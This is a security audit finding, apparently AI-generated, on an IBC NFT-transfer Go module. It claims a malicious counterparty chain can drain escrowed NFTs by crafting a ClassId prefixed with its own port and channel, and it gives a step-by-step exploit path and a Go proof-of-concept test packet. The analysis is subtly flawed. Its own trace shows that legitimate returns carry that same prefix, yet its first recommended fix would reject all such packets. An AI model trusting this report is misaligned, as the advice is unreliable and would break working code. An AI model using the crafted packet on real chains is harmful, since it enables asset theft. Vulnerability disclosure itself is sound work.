### Title
Malicious IBC Counterparty Can Drain Escrow by Crafting ClassId Prefix to Force Unescrow Branch — (`x/nft-transfer/keeper/packet.go`)

### Summary

`processReceivedPacket` determines whether to mint a voucher or unescrow an NFT solely by calling `IsAwayFromOrigin` on the attacker-controlled `data.ClassId` field. A malicious counterparty chain can craft a packet whose `ClassId` is prefixed with the **source** port/channel pair (their own port/channel), causing `IsAwayFromOrigin` to return `false` and forcing the unescrow branch, which calls `TransferOwner` from the escrow address to an arbitrary receiver — stealing any NFT held in that escrow.

### Finding Description

`IsAwayFromOrigin` is defined as: [1](#0-0) 

```go
func IsAwayFromOrigin(sourcePort, sourceChannel, fullClassPath string) bool {
    prefixClassID := GetClassPrefix(sourcePort, sourceChannel)
    return !strings.HasPrefix(fullClassPath, prefixClassID)
}
```

In `processReceivedPacket`, this is called as: [2](#0-1) 

The `data.ClassId` field comes directly from the IBC packet payload — it is fully attacker-controlled when the counterparty chain is malicious. There is no validation in `OnRecvPacket` or `processReceivedPacket` that checks whether `data.ClassId` is a legitimately-originated class path.

When `isAwayFromOrigin` is `false`, the else branch executes: [3](#0-2) 

```go
unprefixedClassID := types.RemoveClassPrefix(packet.GetSourcePort(),
    packet.GetSourceChannel(), data.ClassId)
voucherClassID := types.ParseClassTrace(unprefixedClassID).IBCClassID()
for _, tokenID := range data.TokenIds {
    if err := k.nftKeeper.TransferOwner(ctx,
        voucherClassID, tokenID, escrowAddress, receiver); err != nil {
        return err
    }
}
```

The `escrowAddress` here is `GetEscrowAddress(packet.GetDestPort(), packet.GetDestChannel())` — the receiving chain's escrow for the destination channel.

**Precise exploit path:**

Let Chain A be the victim and Chain B be the attacker-controlled counterparty. Suppose the IBC channel has:
- Source (Chain B) port = `nft`, channel = `channel-X`
- Destination (Chain A) port = `nft`, channel = `channel-Y`

A legitimate user previously sent NFT `realClass/token1` from Chain A to Chain B, which escrowed it at `GetEscrowAddress("nft", "channel-Y")` on Chain A.

The attacker crafts a packet with:
- `data.ClassId = "nft/channel-X/realClass"` (prefixed with the **source** port/channel)
- `data.TokenIds = ["token1"]`
- `data.Receiver = <attacker address on Chain A>`

On Chain A, `processReceivedPacket` evaluates:
1. `IsAwayFromOrigin("nft", "channel-X", "nft/channel-X/realClass")` → `!strings.HasPrefix("nft/channel-X/realClass", "nft/channel-X/")` → `!true` → **`false`**
2. Enters the unescrow branch
3. `unprefixedClassID = RemoveClassPrefix("nft", "channel-X", "nft/channel-X/realClass") = "realClass"`
4. `voucherClassID = "realClass"` (no IBC prefix since no remaining path)
5. `TransferOwner(ctx, "realClass", "token1", escrowAddress, attacker)` — **NFT stolen**

**Note on the question's framing:** The question says "destination chain's own port and channel identifier." The actual check in `IsAwayFromOrigin` uses the **source** port/channel (the counterparty's), not the destination chain's. The attacker must prefix `ClassId` with the source port/channel (their own), not the destination chain's channel. The exploit is real but requires this correction.

`ValidateBasic` on the packet data provides no protection: [4](#0-3) 

It only checks that `ClassId` is non-blank, `TokenIds` is non-empty, and addresses are valid — no check on the ClassId prefix structure.

### Impact Explanation

A malicious counterparty chain can steal any NFT currently held in the escrow address for a given channel. Every NFT that a user on Chain A has ever sent to Chain B via that channel is at risk. This is a direct, unauthorized transfer of NFT ownership — a Critical NFT ownership invariant break.

### Likelihood Explanation

Requires a malicious counterparty chain (or a compromised relayer submitting a crafted packet from a chain that allows arbitrary packet data). This is a realistic IBC threat model: IBC security assumes the counterparty chain may be adversarial. Any chain that opens an IBC NFT channel with a malicious chain is vulnerable.

### Recommendation

In `processReceivedPacket`, validate that `data.ClassId` does **not** begin with the source port/channel prefix before calling `IsAwayFromOrigin`. Alternatively, mirror the ICS-20 fungible token transfer approach: only accept the "return to origin" (unescrow) path if the ClassId is a known IBC class trace that was previously registered by this chain's own outgoing transfer — i.e., verify that a `ClassTrace` record exists for the prefixed class before taking the unescrow branch.

### Proof of Concept

```go
// Pre-condition: escrow realClass/token1 in channel-Y escrow address on Chain A
// (simulating a prior legitimate SendTransfer from Chain A to Chain B)
escrowAddr := types.GetEscrowAddress("nft", "channel-Y")
nftKeeper.MintNFT(ctx, "realClass", "token1", "", "", "", escrowAddr, escrowAddr)

// Attacker crafts packet from malicious Chain B
craftedData := types.NonFungibleTokenPacketData{
    ClassId:   "nft/channel-X/realClass", // source port/channel prefix
    TokenIds:  []string{"token1"},
    TokenUris: []string{""},
    Sender:    attackerOnChainB,
    Receiver:  attackerOnChainA,
}
craftedPacket := channeltypes.Packet{
    SourcePort:         "nft",
    SourceChannel:      "channel-X",
    DestinationPort:    "nft",
    DestinationChannel: "channel-Y",
    // ...
}

// OnRecvPacket → processReceivedPacket
err := keeper.OnRecvPacket(ctx, version, craftedPacket, craftedData)
// err == nil; attackerOnChainA now owns realClass/token1
owner := nftKeeper.GetNFT(ctx, "realClass", "token1").GetOwner()
assert.Equal(t, attackerOnChainA, owner.String()) // PASSES — NFT stolen
```

```go
func (nftpd NonFungibleTokenPacketData) ValidateBasic() error {
	if strings.TrimSpace(nftpd.ClassId) == "" {
		return newsdkerrors.Wrap(ErrInvalidClassID, "classId cannot be blank")
	}

	if len(nftpd.TokenIds) == 0 {
		return newsdkerrors.Wrap(ErrInvalidTokenID, "tokenId cannot be blank")
	}

	if len(nftpd.TokenIds) != len(nftpd.TokenUris) {
		return newsdkerrors.Wrap(ErrInvalidPacket, "tokenIds and tokenUris lengths do not match")
	}

	if strings.TrimSpace(nftpd.Sender) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "sender address cannot be blank")
	}

	// decode the sender address
	if _, err := sdk.AccAddressFromBech32(nftpd.Sender); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid sender address")
	}

	if strings.TrimSpace(nftpd.Receiver) == "" {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "receiver address cannot be blank")
	}

	// decode the receiver address
	if _, err := sdk.AccAddressFromBech32(nftpd.Receiver); err != nil {
		return newsdkerrors.Wrap(sdkerrors.ErrInvalidAddress, "invalid receiver address")
	}
	return nil
}
```
